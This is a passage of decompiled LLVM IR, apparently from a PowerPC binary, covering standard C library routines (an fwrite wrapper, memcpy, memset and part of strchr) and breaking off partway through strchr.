  %v1_10009cc4 = call i32 @__asm_rlwinm(i32 %v4_10009cb4, i32 0, i32 24, i32 25)
  %v3_10009ccc = icmp eq i32 %v1_10009cc4, 192
  br i1 %v3_10009ccc, label %dec_label_pc_10009ce0, label %dec_label_pc_10009cd4

dec_label_pc_10009cd4:                            ; preds = %entry
  store i32 268475608, i32* @lr, align 4
  %v3_10009cd4 = call i32 @__stdio_trans2w_o(i16* nonnull %arg4)
  %v3_10009cd8 = icmp eq i32 %v3_10009cd4, 0
  br i1 %v3_10009cd8, label %dec_label_pc_10009ce0, label %dec_label_pc_10009d38

dec_label_pc_10009ce0:                            ; preds = %dec_label_pc_10009cd4, %entry
  %v0_10009ce0 = load i32, i32* @r29, align 4
  %v3_10009ce0 = icmp eq i32 %v0_10009ce0, 0
  %v0_10009ce4 = load i32, i32* @r30, align 4
  %v3_10009ce4 = icmp eq i32 %v0_10009ce4, 0
  %brmerge = or i1 %v3_10009ce0, %v3_10009ce4
  br i1 %brmerge, label %dec_label_pc_10009d38, label %dec_label_pc_10009cf0

dec_label_pc_10009cf0:                            ; preds = %dec_label_pc_10009ce0
  %v2_10009cf8 = udiv i32 -1, %v0_10009ce0
  %v0_10009cfc = load i32, i32* @r31, align 4
  %v3_10009d00 = icmp ugt i32 %v0_10009ce4, %v2_10009cf8
  %v1_10009d18 = inttoptr i32 %v0_10009cfc to i16*
  br i1 %v3_10009d00, label %dec_label_pc_10009d18, label %dec_label_pc_10009d08

dec_label_pc_10009d08:                            ; preds = %dec_label_pc_10009cf0
  %v0_10009cf4 = load i32, i32* @r28, align 4
  %v2_10009d08 = mul i32 %v0_10009ce4, %v0_10009ce0
  store i32 %v2_10009d08, i32* %r4.global-to-local, align 4
  store i32 268475664, i32* @lr, align 4
  %v5_10009d0c = call i32 @__stdio_fwrite(i32 %v0_10009cf4, i32 %v2_10009d08, i16* %v1_10009d18)
  %v1_10009d10 = load i32, i32* @r29, align 4
  %v2_10009d10 = udiv i32 %v5_10009d0c, %v1_10009d10
  store i32 %v2_10009d10, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10009d3c

dec_label_pc_10009d18:                            ; preds = %dec_label_pc_10009cf0
  %v2_10009d18 = load i16, i16* %v1_10009d18, align 2
  %v1_10009d1c = or i16 %v2_10009d18, 8
  store i16 %v1_10009d1c, i16* %v1_10009d18, align 2
  %v0_10009d24 = call i32 @__errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_10009d30 = inttoptr i32 %v0_10009d24 to i32*
  store i32 22, i32* %v2_10009d30, align 4
  %v0_10009d40.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10009d3c

dec_label_pc_10009d38:                            ; preds = %dec_label_pc_10009ce0, %dec_label_pc_10009cd4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10009d3c

dec_label_pc_10009d3c:                            ; preds = %dec_label_pc_10009d18, %dec_label_pc_10009d08, %dec_label_pc_10009d38
  %v0_10009d40 = phi i32 [ %v0_10009d40.pre, %dec_label_pc_10009d18 ], [ %v2_10009d10, %dec_label_pc_10009d08 ], [ 0, %dec_label_pc_10009d38 ]
  ret i32 %v0_10009d40

; uselistorder directives
  uselistorder i16* %v1_10009d18, { 1, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i16*)* @__stdio_fwrite, { 1, 2, 3, 5, 6, 0, 4 }
  uselistorder label %dec_label_pc_10009d3c, { 2, 0, 1 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10009d54 = load i32, i32* @r5, align 4
  %v1_10009d54 = call i32 @__asm_rlwinm.(i32 %v0_10009d54, i32 29, i32 3, i32 31)
  store i32 %v1_10009d54, i32* %r9.global-to-local, align 4
  %v4_10009d54 = icmp eq i32 %v1_10009d54, 0
  %v0_10009d58 = load i32, i32* @r4, align 4
  %v1_10009d58 = add i32 %v0_10009d58, -4
  store i32 %v1_10009d58, i32* %r4.global-to-local, align 4
  %v0_10009d5c = load i32, i32* @r3, align 4
  %v1_10009d5c = add i32 %v0_10009d5c, -4
  store i32 %v1_10009d5c, i32* @r11, align 4
  br i1 %v4_10009d54, label %dec_label_pc_10009d84, label %dec_label_pc_10009d64

dec_label_pc_10009d64:                            ; preds = %entry
  %v1_10009d64 = urem i32 %v1_10009d5c, 4
  %v3_10009d64 = icmp eq i32 %v1_10009d64, 0
  br i1 %v3_10009d64, label %dec_label_pc_10009d6c, label %dec_label_pc_10009dc0

dec_label_pc_10009d6c:                            ; preds = %dec_label_pc_10009de0.dec_label_pc_10009d6c_crit_edge, %dec_label_pc_10009d64
  %v1_10009d78.pre = phi i32 [ %v1_10009d5c, %dec_label_pc_10009d64 ], [ %v1_10009d78.pre.pre, %dec_label_pc_10009de0.dec_label_pc_10009d6c_crit_edge ]
  %v0_10009d6c = phi i32 [ %v1_10009d54, %dec_label_pc_10009d64 ], [ %v1_10009de0, %dec_label_pc_10009de0.dec_label_pc_10009d6c_crit_edge ]
  %.0 = phi i32 [ undef, %dec_label_pc_10009d64 ], [ %v2_10009dc8, %dec_label_pc_10009de0.dec_label_pc_10009d6c_crit_edge ]
  store i32 %v0_10009d6c, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10009d70

dec_label_pc_10009d70:                            ; preds = %dec_label_pc_10009d70, %dec_label_pc_10009d6c
  %v1_10009d78 = phi i32 [ %v2_10009d7c, %dec_label_pc_10009d70 ], [ %v1_10009d78.pre, %dec_label_pc_10009d6c ]
  %v0_10009d70 = load i32, i32* %r4.global-to-local, align 4
  %v1_10009d70 = add i32 %v0_10009d70, 4
  %v2_10009d70 = inttoptr i32 %v1_10009d70 to i32*
  %v3_10009d70 = load i32, i32* %v2_10009d70, align 4
  %v1_10009d74 = add i32 %v0_10009d70, 8
  %v2_10009d74 = inttoptr i32 %v1_10009d74 to i32*
  %v3_10009d74 = load i32, i32* %v2_10009d74, align 4
  store i32 %v3_10009d74, i32* %r9.global-to-local, align 4
  store i32 %v1_10009d74, i32* %r4.global-to-local, align 4
  %v2_10009d78 = add i32 %v1_10009d78, 4
  %v3_10009d78 = inttoptr i32 %v2_10009d78 to i32*
  store i32 %v3_10009d70, i32* %v3_10009d78, align 4
  %v0_10009d7c = load i32, i32* %r9.global-to-local, align 4
  %v1_10009d7c = load i32, i32* @r11, align 4
  %v2_10009d7c = add i32 %v1_10009d7c, 8
  %v3_10009d7c = inttoptr i32 %v2_10009d7c to i32*
  store i32 %v0_10009d7c, i32* %v3_10009d7c, align 4
  store i32 %v2_10009d7c, i32* @r11, align 4
  %v0_10009d80 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009d80 = add i32 %v0_10009d80, -1
  store i32 %v1_10009d80, i32* %ctr.global-to-local, align 4
  %v2_10009d80 = icmp eq i32 %v1_10009d80, 0
  br i1 %v2_10009d80, label %dec_label_pc_10009d84, label %dec_label_pc_10009d70

dec_label_pc_10009d84:                            ; preds = %dec_label_pc_10009d70, %dec_label_pc_10009de0, %entry
  %.1 = phi i32 [ undef, %entry ], [ %v2_10009dc8, %dec_label_pc_10009de0 ], [ %.0, %dec_label_pc_10009d70 ]
  %v1_10009d84 = urem i32 %.1, 8
  store i32 %v1_10009d84, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_10009d84, 4
  br i1 %tmp, label %dec_label_pc_10009d9c, label %dec_label_pc_10009d90

dec_label_pc_10009d90:                            ; preds = %dec_label_pc_10009d84
  %v0_10009d90 = load i32, i32* %r4.global-to-local, align 4
  %v1_10009d90 = add i32 %v0_10009d90, 4
  %v2_10009d90 = inttoptr i32 %v1_10009d90 to i32*
  %v3_10009d90 = load i32, i32* %v2_10009d90, align 4
  store i32 %v1_10009d90, i32* %r4.global-to-local, align 4
  %v1_10009d94 = add nsw i32 %v1_10009d84, -4
  store i32 %v1_10009d94, i32* @r5, align 4
  %v1_10009d98 = load i32, i32* @r11, align 4
  %v2_10009d98 = add i32 %v1_10009d98, 4
  %v3_10009d98 = inttoptr i32 %v2_10009d98 to i32*
  store i32 %v3_10009d90, i32* %v3_10009d98, align 4
  store i32 %v2_10009d98, i32* @r11, align 4
  %v0_10009d9c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10009d9c

dec_label_pc_10009d9c:                            ; preds = %dec_label_pc_10009d84, %dec_label_pc_10009d90
  %v0_10009d9c = phi i32 [ %v1_10009d84, %dec_label_pc_10009d84 ], [ %v0_10009d9c.pre, %dec_label_pc_10009d90 ]
  %v3_10009d9c = icmp eq i32 %v0_10009d9c, 0
  %v0_10009da0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10009d9c, i32 %v0_10009da0)
  %v0_10009da4 = load i32, i32* @r5, align 4
  store i32 %v0_10009da4, i32* %ctr.global-to-local, align 4
  %v0_10009da8 = load i32, i32* %r4.global-to-local, align 4
  %v1_10009da8 = add i32 %v0_10009da8, 3
  store i32 %v1_10009da8, i32* %r4.global-to-local, align 4
  %v0_10009dac = load i32, i32* @r11, align 4
  %v1_10009dac = add i32 %v0_10009dac, 3
  store i32 %v1_10009dac, i32* %r9.global-to-local, align 4
  %v1_10009db09 = add i32 %v0_10009da8, 4
  %v2_10009db010 = inttoptr i32 %v1_10009db09 to i8*
  %v3_10009db011 = load i8, i8* %v2_10009db010, align 1
  store i32 %v1_10009db09, i32* %r4.global-to-local, align 4
  %v3_10009db413 = add i32 %v0_10009dac, 4
  %v4_10009db414 = inttoptr i32 %v3_10009db413 to i8*
  store i8 %v3_10009db011, i8* %v4_10009db414, align 1
  store i32 %v3_10009db413, i32* %r9.global-to-local, align 4
  %v0_10009db815 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009db816 = add i32 %v0_10009db815, -1
  store i32 %v1_10009db816, i32* %ctr.global-to-local, align 4
  %v2_10009db817 = icmp eq i32 %v1_10009db816, 0
  br i1 %v2_10009db817, label %dec_label_pc_10009dec, label %dec_label_pc_10009db0.dec_label_pc_10009db0_crit_edge

dec_label_pc_10009db0.dec_label_pc_10009db0_crit_edge: ; preds = %dec_label_pc_10009d9c, %dec_label_pc_10009db0.dec_label_pc_10009db0_crit_edge
  %v3_10009db418 = phi i32 [ %v3_10009db4, %dec_label_pc_10009db0.dec_label_pc_10009db0_crit_edge ], [ %v3_10009db413, %dec_label_pc_10009d9c ]
  %v0_10009db0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10009db0 = add i32 %v0_10009db0.pre, 1
  %v2_10009db0 = inttoptr i32 %v1_10009db0 to i8*
  %v3_10009db0 = load i8, i8* %v2_10009db0, align 1
  store i32 %v1_10009db0, i32* %r4.global-to-local, align 4
  %v3_10009db4 = add i32 %v3_10009db418, 1
  %v4_10009db4 = inttoptr i32 %v3_10009db4 to i8*
  store i8 %v3_10009db0, i8* %v4_10009db4, align 1
  store i32 %v3_10009db4, i32* %r9.global-to-local, align 4
  %v0_10009db8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009db8 = add i32 %v0_10009db8, -1
  store i32 %v1_10009db8, i32* %ctr.global-to-local, align 4
  %v2_10009db8 = icmp eq i32 %v1_10009db8, 0
  br i1 %v2_10009db8, label %dec_label_pc_10009dec, label %dec_label_pc_10009db0.dec_label_pc_10009db0_crit_edge

dec_label_pc_10009dc0:                            ; preds = %dec_label_pc_10009d64
  %v1_10009dc0 = sub nsw i32 4, %v1_10009d64
  store i32 %v1_10009dc0, i32* %ctr.global-to-local, align 4
  %v1_10009dc8 = load i32, i32* @r5, align 4
  %v2_10009dc8 = sub i32 %v1_10009dc8, %v1_10009dc0
  br label %dec_label_pc_10009dcc

dec_label_pc_10009dcc:                            ; preds = %dec_label_pc_10009dcc.dec_label_pc_10009dcc_crit_edge, %dec_label_pc_10009dc0
  %v2_10009dd4 = phi i32 [ %v1_10009dd8, %dec_label_pc_10009dcc.dec_label_pc_10009dcc_crit_edge ], [ %v1_10009d5c, %dec_label_pc_10009dc0 ]
  %v0_10009dcc = phi i32 [ %v0_10009dcc.pre, %dec_label_pc_10009dcc.dec_label_pc_10009dcc_crit_edge ], [ %v1_10009d58, %dec_label_pc_10009dc0 ]
  %v1_10009dcc = add i32 %v0_10009dcc, 4
  %v2_10009dcc = inttoptr i32 %v1_10009dcc to i8*
  %v3_10009dcc = load i8, i8* %v2_10009dcc, align 1
  %v1_10009dd0 = add i32 %v0_10009dcc, 1
  store i32 %v1_10009dd0, i32* %r4.global-to-local, align 4
  %v3_10009dd4 = add i32 %v2_10009dd4, 4
  %v4_10009dd4 = inttoptr i32 %v3_10009dd4 to i8*
  store i8 %v3_10009dcc, i8* %v4_10009dd4, align 1
  %v0_10009dd8 = load i32, i32* @r11, align 4
  %v1_10009dd8 = add i32 %v0_10009dd8, 1
  store i32 %v1_10009dd8, i32* @r11, align 4
  %v0_10009ddc = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009ddc = add i32 %v0_10009ddc, -1
  store i32 %v1_10009ddc, i32* %ctr.global-to-local, align 4
  %v2_10009ddc = icmp eq i32 %v1_10009ddc, 0
  br i1 %v2_10009ddc, label %dec_label_pc_10009de0, label %dec_label_pc_10009dcc.dec_label_pc_10009dcc_crit_edge

dec_label_pc_10009dcc.dec_label_pc_10009dcc_crit_edge: ; preds = %dec_label_pc_10009dcc
  %v0_10009dcc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10009dcc

dec_label_pc_10009de0:                            ; preds = %dec_label_pc_10009dcc
  %v1_10009de0 = call i32 @__asm_rlwinm.(i32 %v2_10009dc8, i32 29, i32 3, i32 31)
  store i32 %v1_10009de0, i32* %r9.global-to-local, align 4
  %v4_10009de0 = icmp eq i32 %v1_10009de0, 0
  br i1 %v4_10009de0, label %dec_label_pc_10009d84, label %dec_label_pc_10009de0.dec_label_pc_10009d6c_crit_edge

dec_label_pc_10009de0.dec_label_pc_10009d6c_crit_edge: ; preds = %dec_label_pc_10009de0
  %v1_10009d78.pre.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_10009d6c

dec_label_pc_10009dec:                            ; preds = %dec_label_pc_10009db0.dec_label_pc_10009db0_crit_edge, %dec_label_pc_10009d9c
  %v0_10009dec = load i32, i32* @r3, align 4
  ret i32 %v0_10009dec

; uselistorder directives
  uselistorder i32 %v1_10009de0, { 1, 2, 0 }
  uselistorder i32 %v1_10009ddc, { 1, 0 }
  uselistorder i32 %v1_10009dd8, { 1, 0 }
  uselistorder i32 %v0_10009dcc, { 1, 0 }
  uselistorder i32 %v2_10009dc8, { 2, 1, 0 }
  uselistorder i32 %v1_10009db8, { 1, 0 }
  uselistorder i32 %v3_10009db4, { 1, 2, 0 }
  uselistorder i32 %v1_10009d84, { 3, 2, 1, 0 }
  uselistorder i32 %v1_10009d80, { 1, 0 }
  uselistorder i32 %v2_10009d7c, { 1, 2, 0 }
  uselistorder i32 %v1_10009d64, { 1, 0 }
  uselistorder i32 %v1_10009d5c, { 2, 1, 0, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 4, 3, 0, 5, 8, 6, 10, 7, 9, 11 }
  uselistorder i32* %ctr.global-to-local, { 1, 2, 3, 5, 4, 0, 6, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_10009db0.dec_label_pc_10009db0_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10009d9c, { 1, 0 }
  uselistorder label %dec_label_pc_10009d84, { 1, 0, 2 }
}

define i32 @__GI_memset(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_10009df0 = call i32 @__asm_rlwinm.(i32 %arg3, i32 29, i32 3, i32 31)
  store i32 %v1_10009df0, i32* %r9.global-to-local, align 4
  %v4_10009df0 = icmp eq i32 %v1_10009df0, 0
  store i1 %v4_10009df0, i1* %cr0_eq.global-to-local, align 1
  store i1 false, i1* @cr0_so, align 1
  %v1_10009df8 = add i32 %arg1, -4
  store i32 %v1_10009df8, i32* %r11.global-to-local, align 4
  %v1_10009dfc = call i32 @__asm_rlwimi(i32 %arg2, i32 8, i32 16, i32 23)
  %v1_10009e00 = call i32 @__asm_rlwimi(i32 %v1_10009dfc, i32 16, i32 0, i32 15)
  %v2_10009e00 = trunc i32 %v1_10009e00 to i8
  %v0_10009e04 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_10009e04, label %dec_label_pc_10009e28, label %dec_label_pc_10009e08

dec_label_pc_10009e08:                            ; preds = %entry
  %v0_10009e08 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009e08 = urem i32 %v0_10009e08, 4
  %v3_10009e08 = icmp eq i32 %v1_10009e08, 0
  store i1 %v3_10009e08, i1* %cr0_eq.global-to-local, align 1
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_10009e08, label %dec_label_pc_10009e08.dec_label_pc_10009e10_crit_edge, label %dec_label_pc_10009e58

dec_label_pc_10009e08.dec_label_pc_10009e10_crit_edge: ; preds = %dec_label_pc_10009e08
  %v0_10009e10.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10009e10

dec_label_pc_10009e10:                            ; preds = %dec_label_pc_10009e70.dec_label_pc_10009e10_crit_edge, %dec_label_pc_10009e08.dec_label_pc_10009e10_crit_edge
  %v0_10009e14.pre = phi i32 [ %v0_10009e08, %dec_label_pc_10009e08.dec_label_pc_10009e10_crit_edge ], [ %v0_10009e14.pre.pre, %dec_label_pc_10009e70.dec_label_pc_10009e10_crit_edge ]
  %v0_10009e10 = phi i32 [ %v0_10009e10.pre, %dec_label_pc_10009e08.dec_label_pc_10009e10_crit_edge ], [ %v1_10009e70, %dec_label_pc_10009e70.dec_label_pc_10009e10_crit_edge ]
  store i32 %v0_10009e10, i32* %ctr.global-to-local, align 4
  %v1_10009e18 = sext i8 %v2_10009e00 to i32
  br label %dec_label_pc_10009e14

dec_label_pc_10009e14:                            ; preds = %dec_label_pc_10009e14, %dec_label_pc_10009e10
  %v0_10009e14 = phi i32 [ %v1_10009e20, %dec_label_pc_10009e14 ], [ %v0_10009e14.pre, %dec_label_pc_10009e10 ]
  %v1_10009e14 = add i32 %v0_10009e14, 4
  store i32 %v1_10009e14, i32* %r9.global-to-local, align 4
  %v4_10009e18 = inttoptr i32 %v1_10009e14 to i32*
  store i32 %v1_10009e18, i32* %v4_10009e18, align 4
  %v2_10009e1c = load i32, i32* %r9.global-to-local, align 4
  %v3_10009e1c = add i32 %v2_10009e1c, 4
  %v4_10009e1c = inttoptr i32 %v3_10009e1c to i32*
  store i32 %v1_10009e18, i32* %v4_10009e1c, align 4
  %v0_10009e20 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009e20 = add i32 %v0_10009e20, 4
  store i32 %v1_10009e20, i32* %r11.global-to-local, align 4
  %v0_10009e24 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009e24 = add i32 %v0_10009e24, -1
  store i32 %v1_10009e24, i32* %ctr.global-to-local, align 4
  %v2_10009e24 = icmp eq i32 %v1_10009e24, 0
  br i1 %v2_10009e24, label %dec_label_pc_10009e28, label %dec_label_pc_10009e14

dec_label_pc_10009e28:                            ; preds = %dec_label_pc_10009e14, %dec_label_pc_10009e70, %entry
  %v0_10009e28 = load i32, i32* %r5.global-to-local, align 4
  %v1_10009e28 = urem i32 %v0_10009e28, 8
  store i32 %v1_10009e28, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_10009e28, 4
  br i1 %tmp, label %dec_label_pc_10009e3c, label %dec_label_pc_10009e34

dec_label_pc_10009e34:                            ; preds = %dec_label_pc_10009e28
  %v1_10009e34 = sext i8 %v2_10009e00 to i32
  %v2_10009e34 = load i32, i32* %r11.global-to-local, align 4
  %v3_10009e34 = add i32 %v2_10009e34, 4
  %v4_10009e34 = inttoptr i32 %v3_10009e34 to i32*
  store i32 %v1_10009e34, i32* %v4_10009e34, align 4
  store i32 %v3_10009e34, i32* %r11.global-to-local, align 4
  %v0_10009e38 = load i32, i32* @r5, align 4
  %v1_10009e38 = add i32 %v0_10009e38, -4
  store i32 %v1_10009e38, i32* @r5, align 4
  br label %dec_label_pc_10009e3c

dec_label_pc_10009e3c:                            ; preds = %dec_label_pc_10009e28, %dec_label_pc_10009e34
  %v0_10009e3c = phi i32 [ %v1_10009e28, %dec_label_pc_10009e28 ], [ %v1_10009e38, %dec_label_pc_10009e34 ]
  %v3_10009e3c = icmp eq i32 %v0_10009e3c, 0
  %v0_10009e40 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10009e3c, i32 %v0_10009e40)
  %v0_10009e44 = load i32, i32* @r5, align 4
  store i32 %v0_10009e44, i32* %ctr.global-to-local, align 4
  %v0_10009e48 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009e48 = add i32 %v0_10009e48, 3
  store i32 %v1_10009e48, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10009e4c

dec_label_pc_10009e4c:                            ; preds = %dec_label_pc_10009e4c, %dec_label_pc_10009e3c
  %v3_10009e4c = phi i32 [ %v4_10009e4c, %dec_label_pc_10009e4c ], [ %v1_10009e48, %dec_label_pc_10009e3c ]
  %v4_10009e4c = add i32 %v3_10009e4c, 1
  %v5_10009e4c = inttoptr i32 %v4_10009e4c to i8*
  store i8 %v2_10009e00, i8* %v5_10009e4c, align 1
  store i32 %v4_10009e4c, i32* %r9.global-to-local, align 4
  %v0_10009e50 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009e50 = add i32 %v0_10009e50, -1
  store i32 %v1_10009e50, i32* %ctr.global-to-local, align 4
  %v2_10009e50 = icmp eq i32 %v1_10009e50, 0
  br i1 %v2_10009e50, label %dec_label_pc_10009e7c, label %dec_label_pc_10009e4c

dec_label_pc_10009e58:                            ; preds = %dec_label_pc_10009e08
  %v1_10009e58 = sub nsw i32 4, %v1_10009e08
  store i32 %v1_10009e58, i32* %ctr.global-to-local, align 4
  %v1_10009e60 = load i32, i32* %r5.global-to-local, align 4
  %v2_10009e60 = sub i32 %v1_10009e60, %v1_10009e58
  store i32 %v2_10009e60, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10009e64

dec_label_pc_10009e64:                            ; preds = %dec_label_pc_10009e64, %dec_label_pc_10009e58
  %v3_10009e64 = phi i32 [ %v1_10009e68, %dec_label_pc_10009e64 ], [ %v0_10009e08, %dec_label_pc_10009e58 ]
  %v4_10009e64 = add i32 %v3_10009e64, 4
  %v5_10009e64 = inttoptr i32 %v4_10009e64 to i8*
  store i8 %v2_10009e00, i8* %v5_10009e64, align 1
  %v0_10009e68 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009e68 = add i32 %v0_10009e68, 1
  store i32 %v1_10009e68, i32* %r11.global-to-local, align 4
  %v0_10009e6c = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009e6c = add i32 %v0_10009e6c, -1
  store i32 %v1_10009e6c, i32* %ctr.global-to-local, align 4
  %v2_10009e6c = icmp eq i32 %v1_10009e6c, 0
  br i1 %v2_10009e6c, label %dec_label_pc_10009e70, label %dec_label_pc_10009e64

dec_label_pc_10009e70:                            ; preds = %dec_label_pc_10009e64
  %v0_10009e70 = load i32, i32* %r5.global-to-local, align 4
  %v1_10009e70 = call i32 @__asm_rlwinm.(i32 %v0_10009e70, i32 29, i32 3, i32 31)
  store i32 %v1_10009e70, i32* %r9.global-to-local, align 4
  %v4_10009e70 = icmp eq i32 %v1_10009e70, 0
  store i1 %v4_10009e70, i1* %cr0_eq.global-to-local, align 1
  store i1 false, i1* @cr0_so, align 1
  br i1 %v4_10009e70, label %dec_label_pc_10009e28, label %dec_label_pc_10009e70.dec_label_pc_10009e10_crit_edge

dec_label_pc_10009e70.dec_label_pc_10009e10_crit_edge: ; preds = %dec_label_pc_10009e70
  %v0_10009e14.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009e10

dec_label_pc_10009e7c:                            ; preds = %dec_label_pc_10009e4c
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_10009e70, { 1, 2, 0 }
  uselistorder i32 %v1_10009e6c, { 1, 0 }
  uselistorder i32 %v1_10009e68, { 1, 0 }
  uselistorder i32 %v1_10009e50, { 1, 0 }
  uselistorder i32 %v4_10009e4c, { 1, 2, 0 }
  uselistorder i32 %v1_10009e28, { 2, 1, 0 }
  uselistorder i32 %v1_10009e24, { 1, 0 }
  uselistorder i32 %v1_10009e20, { 1, 0 }
  uselistorder i32 %v1_10009e08, { 1, 0 }
  uselistorder i32 %v0_10009e08, { 2, 1, 0 }
  uselistorder i8 %v2_10009e00, { 2, 1, 3, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 4, 0, 3, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwimi, { 3, 4, 0, 1, 2 }
  uselistorder i1* @cr0_so, { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_10009e3c, { 1, 0 }
  uselistorder label %dec_label_pc_10009e28, { 1, 0, 2 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_10009e80 = urem i32 %arg1, 256
  store i32 %v1_10009e80, i32* %r4.global-to-local, align 4
  %v0_10009ea02 = load i32, i32* @r3, align 4
  %v1_10009ea03 = urem i32 %v0_10009ea02, 4
  %v3_10009ea05 = icmp eq i32 %v1_10009ea03, 0
  br i1 %v3_10009ea05, label %dec_label_pc_10009ea8, label %dec_label_pc_10009e88

dec_label_pc_10009e88:                            ; preds = %entry, %dec_label_pc_10009e9c
  %v1_10009e8c = phi i32 [ %v0_10009ea8.pre, %dec_label_pc_10009e9c ], [ %v1_10009e80, %entry ]
  %v0_10009e88 = phi i32 [ %v1_10009e9c, %dec_label_pc_10009e9c ], [ %v0_10009ea02, %entry ]
  %v1_10009e88 = inttoptr i32 %v0_10009e88 to i8*
  %v2_10009e88 = load i8, i8* %v1_10009e88, align 1
  %v3_10009e88 = zext i8 %v2_10009e88 to i32
  %v4_10009e8c = icmp eq i32 %v3_10009e88, %v1_10009e8c
  %v3_10009e90 = icmp eq i8 %v2_10009e88, 0
  %v0_10009e94 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10009e8c, i32 %v0_10009e94)
  br i1 %v3_10009e90, label %dec_label_pc_10009f78, label %dec_label_pc_10009e9c

dec_label_pc_10009e9c:                            ; preds = %dec_label_pc_10009e88
  %v0_10009e9c = load i32, i32* @r3, align 4
  %v1_10009e9c = add i32 %v0_10009e9c, 1
  store i32 %v1_10009e9c, i32* @r3, align 4
  %v1_10009ea0 = urem i32 %v1_10009e9c, 4
  %v3_10009ea0 = icmp eq i32 %v1_10009ea0, 0
  %v0_10009ea8.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_10009ea0, label %dec_label_pc_10009ea8, label %dec_label_pc_10009e88

dec_label_pc_10009ea8:                            ; preds = %dec_label_pc_10009e9c, %entry
  %v0_10009ec010 = phi i32 [ %v0_10009ea02, %entry ], [ %v1_10009e9c, %dec_label_pc_10009e9c ]
  %v0_10009ea8 = phi i32 [ %v1_10009e80, %entry ], [ %v0_10009ea8.pre, %dec_label_pc_10009e9c ]
  %v1_10009ea8 = mul i32 %v0_10009ea8, 256
  %v2_10009eb0 = or i32 %v1_10009ea8, %v0_10009ea8
  %v1_10009eb8 = mul i32 %v2_10009eb0, 65536
  %v2_10009ebc = or i32 %v1_10009eb8, %v2_10009eb0
  br label %dec_label_pc_10009ec0

dec_label_pc_10009ec0:                            ; preds = %dec_label_pc_10009ec0, %dec_label_pc_10009f74, %dec_label_pc_10009ea8
  %v0_10009f18 = phi i32 [ %v0_10009ec010, %dec_label_pc_10009ea8 ], [ %v1_10009ec4, %dec_label_pc_10009f74 ], [ %v1_10009ec4, %dec_label_pc_10009ec0 ]
  %v1_10009ec0 = inttoptr i32 %v0_10009f18 to i32*
  %v2_10009ec0 = load i32, i32* %v1_10009ec0, align 4
  %v1_10009ec4 = add i32 %v0_10009f18, 4
  %v2_10009ecc = xor i32 %v2_10009ec0, %v2_10009ebc
  %v1_10009ed0 = add i32 %v2_10009ec0, 2130640639
  %v2_10009ed8 = xor i32 %v1_10009ed0, %v2_10009ec0
  %v1_10009edc = add i32 %v2_10009ecc, 2130640639
  %v2_10009ee0 = and i32 %v2_10009ed8, -2130640640
  %v3_10009ee0 = xor i32 %v2_10009ee0, -2130640640
  %v2_10009ee4 = xor i32 %v1_10009edc, %v2_10009ecc
  %v2_10009ee8 = and i32 %v2_10009ee4, -2130640640
  %v3_10009ee8 = xor i32 %v2_10009ee8, -2130640640
  %v1_10009ef4 = add i32 %v0_10009f18, 1
  %tmp = or i32 %v3_10009ee8, %v3_10009ee0
  %brmerge = icmp eq i32 %tmp, 0
  br i1 %brmerge, label %dec_label_pc_10009ec0, label %dec_label_pc_10009f00

dec_label_pc_10009f00:                            ; preds = %dec_label_pc_10009ec0
  %v2_10009f00 = inttoptr i32 %v0_10009f18 to i8*
  %v3_10009f00 = load i8, i8* %v2_10009f00, align 1
  %v4_10009f00 = zext i8 %v3_10009f00 to i32
